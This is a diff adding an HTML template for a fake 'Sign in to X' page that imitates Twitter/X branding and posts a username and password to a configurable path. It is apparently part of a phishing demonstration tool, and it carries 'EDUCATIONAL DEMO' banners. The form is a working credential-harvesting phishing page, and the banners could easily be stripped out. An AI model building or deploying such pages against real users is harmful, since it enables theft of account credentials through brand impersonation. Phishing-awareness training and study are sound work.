@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Twitter / X Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .twitter-blue { background-color: #1da1f2; }
+    </style>
+</head>
+<body class="bg-black text-white">
+    <div class="bg-red-600 p-2 text-center">
+        <strong>EDUCATIONAL DEMO:</strong> {{ warning }}
+    </div>
+
+    <div class="max-w-md mx-auto py-8 px-4">
+        <div class="text-center mb-8">
+            <div class="w-12 h-12 twitter-blue rounded-full mx-auto mb-4 flex items-center justify-center">
+                <span class="text-white font-bold">X</span>
+            </div>
+            <h1 class="text-3xl font-bold">Sign in to X</h1>
+        </div>
+
+        <form action="/{{ custom_path }}/submit" method="POST" class="space-y-4">
+            <input type="text" name="username" placeholder="Username, email or phone" 
+                   class="w-full p-3 bg-black border border-gray-700 rounded text-white focus:outline-none focus:border-blue-400" required>
+            
+            <input type="password" name="password" placeholder="Password" 
+                   class="w-full p-3 bg-black border border-gray-700 rounded text-white focus:outline-none focus:border-blue-400" required>
+
+            <button type="submit" class="twitter-blue text-white w-full p-3 rounded font-bold">
+                Sign in
+            </button>
+
+            <div class="text-center text-sm text-gray-400">
+                <a href="#">Forgot password?</a>
+            </div>
+        </form>
+
+        <div class="mt-6 p-3 bg-blue-900 rounded text-sm">
+            <strong>Educational:</strong> This demonstrates phishing techniques. Verify URLs carefully.
+        </div>
+    </div>
+</body>
+</html>
